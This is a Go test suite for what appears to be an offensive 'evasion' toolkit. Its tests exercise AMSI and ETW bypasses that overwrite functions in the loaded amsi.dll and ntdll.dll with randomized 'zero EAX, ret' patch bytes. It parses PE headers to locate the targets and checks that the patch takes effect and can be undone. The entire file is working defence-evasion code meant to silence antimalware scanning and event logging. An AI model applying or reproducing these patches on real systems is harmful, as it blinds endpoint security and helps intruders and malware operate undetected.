//go:build windows && amd64

package securityctl

import (
	"syscall"
	"testing"
	"unsafe"

	"dark-arts/pkg/evasion"
)

func TestAMSIControl_FullLifecycle(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	a := NewAMSIControl()
	if err := a.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if s := a.Status(); s != StatusInitialized {
		t.Errorf("after Initialize: status = %v, want StatusInitialized", s)
	}
	if err := a.Enable(); err != nil {
		t.Fatalf("Enable() = %v", err)
	}
	if s := a.Status(); s != StatusEnabled {
		t.Errorf("after Enable: status = %v, want StatusEnabled", s)
	}
	if err := a.Disable(); err != nil {
		t.Fatalf("Disable() = %v", err)
	}
	if s := a.Status(); s != StatusDisabled {
		t.Errorf("after Disable: status = %v, want StatusDisabled", s)
	}
	a.Restore()
}

func TestETWControl_FullLifecycle(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	e := NewETWControl()
	if err := e.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if s := e.Status(); s != StatusInitialized {
		t.Errorf("after Initialize: status = %v, want StatusInitialized", s)
	}
	if err := e.Enable(); err != nil {
		t.Fatalf("Enable() = %v", err)
	}
	if s := e.Status(); s != StatusEnabled {
		t.Errorf("after Enable: status = %v, want StatusEnabled", s)
	}
	if err := e.Disable(); err != nil {
		t.Fatalf("Disable() = %v", err)
	}
	if s := e.Status(); s != StatusDisabled {
		t.Errorf("after Disable: status = %v, want StatusDisabled", s)
	}
	e.Restore()
}

func TestAMSIControl_PatchIntegrity(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	a := NewAMSIControl()
	if err := a.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if a.fp == nil {
		t.Fatal("fp is nil after Initialize")
	}
	orig := make([]byte, len(a.fp.orig))
	copy(orig, a.fp.orig)
	if err := a.Enable(); err != nil {
		t.Fatalf("Enable() = %v", err)
	}
	if err := a.Disable(); err != nil {
		t.Fatalf("Disable() = %v", err)
	}
	for i, b := range a.fp.orig {
		if b != orig[i] {
			t.Fatalf("byte %d: got %02x, want %02x after restore", i, b, orig[i])
		}
	}
}

func TestETWControl_PatchIntegrity(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	e := NewETWControl()
	if err := e.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if e.fp == nil {
		t.Fatal("fp is nil after Initialize")
	}
	orig := make([]byte, len(e.fp.orig))
	copy(orig, e.fp.orig)
	if err := e.Enable(); err != nil {
		t.Fatalf("Enable() = %v", err)
	}
	if err := e.Disable(); err != nil {
		t.Fatalf("Disable() = %v", err)
	}
	for i, b := range e.fp.orig {
		if b != orig[i] {
			t.Fatalf("byte %d: got %02x, want %02x after restore", i, b, orig[i])
		}
	}
}

func TestAMSIControl_RestoreIsIdempotent(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	a := NewAMSIControl()
	if err := a.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if err := a.Enable(); err != nil {
		t.Fatalf("Enable() = %v", err)
	}
	a.Restore()
	a.Restore()
}

func TestETWControl_RestoreIsIdempotent(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	e := NewETWControl()
	if err := e.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if err := e.Enable(); err != nil {
		t.Fatalf("Enable() = %v", err)
	}
	e.Restore()
	e.Restore()
}

// loadedModuleBase returns the base address of an already-loaded module.
func loadedModuleBase(dllName string) uintptr {
	k32 := syscall.NewLazyDLL("kernel32.dll")
	getHandle := k32.NewProc("GetModuleHandleW")
	namePtr, _ := syscall.UTF16PtrFromString(dllName)
	h, _, _ := getHandle.Call(uintptr(unsafe.Pointer(namePtr)))
	return h
}

// TestAMSIControl_TargetsLoadedModule verifies that the function address
// resolved by resolveFuncByHash is within the already-loaded amsi.dll
// module's image range, NOT in a separate KnownDll mapping.
func TestAMSIControl_TargetsLoadedModule(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	a := NewAMSIControl()
	if err := a.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if a.fp == nil {
		t.Fatal("fp is nil after Initialize")
	}

	base := loadedModuleBase("amsi.dll")
	if base == 0 {
		t.Skip("amsi.dll not loaded")
	}

	// The function address must be within the loaded module's image.
	// Get the module's size from its PE header.
	nt := unsafe.Add(toPtr(base), uintptr(*(*uint32)(unsafe.Add(toPtr(base), 0x3C))))
	opt := unsafe.Add(nt, 0x18)
	sizeOfImage := uintptr(*(*uint32)(unsafe.Add(opt, 0x38)))
	if a.fp.addr < base || a.fp.addr >= base+sizeOfImage {
		t.Errorf("AMSI function addr 0x%X is outside loaded amsi.dll range [0x%X, 0x%X)",
			a.fp.addr, base, base+sizeOfImage)
	}
}

// TestETWControl_TargetsLoadedModule verifies that the function address
// resolved by resolveFuncByHash is within the already-loaded ntdll.dll
// module's image range, NOT in a separate KnownDll mapping.
func TestETWControl_TargetsLoadedModule(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	e := NewETWControl()
	if err := e.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if e.fp == nil {
		t.Fatal("fp is nil after Initialize")
	}

	base := loadedModuleBase("ntdll.dll")
	if base == 0 {
		t.Skip("ntdll.dll not loaded")
	}

	nt := unsafe.Add(toPtr(base), uintptr(*(*uint32)(unsafe.Add(toPtr(base), 0x3C))))
	opt := unsafe.Add(nt, 0x18)
	sizeOfImage := uintptr(*(*uint32)(unsafe.Add(opt, 0x38)))
	if e.fp.addr < base || e.fp.addr >= base+sizeOfImage {
		t.Errorf("ETW function addr 0x%X is outside loaded ntdll.dll range [0x%X, 0x%X)",
			e.fp.addr, base, base+sizeOfImage)
	}
}

// TestAMSIControl_PatchVisibleAfterEnable verifies that after Enable(),
// the first 2 bytes at the function address match the patch (not the original).
func TestAMSIControl_PatchVisibleAfterEnable(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	a := NewAMSIControl()
	if err := a.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if err := a.Enable(); err != nil {
		t.Fatalf("Enable() = %v", err)
	}
	defer a.Disable()

	// Read live bytes at the patched address.
	live := make([]byte, 2)
	for i := 0; i < 2; i++ {
		live[i] = *(*byte)(unsafe.Add(toPtr(a.fp.addr), i))
	}
	// The patch starts with a zeroing instruction (33 C0, 31 C0, 29 C0, 48 31 C0, or 45 31 C0).
	// All variants set EAX to 0. Check that the first byte is one of the expected opcodes.
	switch live[0] {
	case 0x33, 0x31, 0x29: // xor eax/eax or sub eax,eax
		// ok
	case 0x48:
		// xor rax,rax — second byte must be 0x31
		if live[1] != 0x31 {
			t.Errorf("unexpected patch bytes at 0x%X: %02X %02X", a.fp.addr, live[0], live[1])
		}
	case 0x45:
		// xor r8d,r8d — this was removed; should not appear
		t.Errorf("r8d variant still present in patch at 0x%X: %02X %02X", a.fp.addr, live[0], live[1])
	default:
		t.Errorf("unexpected patch bytes at 0x%X: %02X %02X", a.fp.addr, live[0], live[1])
	}
}

// TestRandomPatchBytes_AllVariantsSetEAX verifies that every possible
// randomized patch variant zeroes EAX/RAX before the ret instruction.
func TestRandomPatchBytes_AllVariantsSetEAX(t *testing.T) {
	seen := make(map[byte]bool)
	for i := 0; i < 1000; i++ {
		patch := randomPatchBytes()
		// The first instruction must zero a register that includes EAX.
		// All valid opcodes: 33 C0, 31 C0, 29 C0, 48 31 C0 (no 45 31 C0).
		switch patch[0] {
		case 0x33: // xor eax, eax
			if patch[1] != 0xC0 {
				t.Fatalf("invalid xor eax,eax encoding: %02X %02X", patch[0], patch[1])
			}
		case 0x31: // xor eax, eax (alternative encoding)
			if patch[1] != 0xC0 {
				t.Fatalf("invalid xor eax,eax encoding: %02X %02X", patch[0], patch[1])
			}
		case 0x29: // sub eax, eax
			if patch[1] != 0xC0 {
				t.Fatalf("invalid sub eax,eax encoding: %02X %02X", patch[0], patch[1])
			}
		case 0x48: // xor rax, rax
			if patch[1] != 0x31 || patch[2] != 0xC0 {
				t.Fatalf("invalid xor rax,rax encoding: %02X %02X %02X", patch[0], patch[1], patch[2])
			}
		default:
			t.Fatalf("unexpected patch opcode: %02X (full: %02X)", patch[0], patch[:4])
		}
		// Ret must follow the zeroing instruction.
		retIdx := -1
		for j := 0; j < len(patch); j++ {
			if patch[j] == 0xC3 {
				retIdx = j
				break
			}
		}
		if retIdx < 2 || retIdx > 5 {
			t.Fatalf("ret (C3) not found at expected position: %v", patch)
		}
		seen[patch[0]] = true
	}
	// All variants should have been seen after 1000 iterations.
	if len(seen) < 4 {
		t.Errorf("only %d unique first bytes seen in 1000 iterations: %v", len(seen), seen)
	}
}
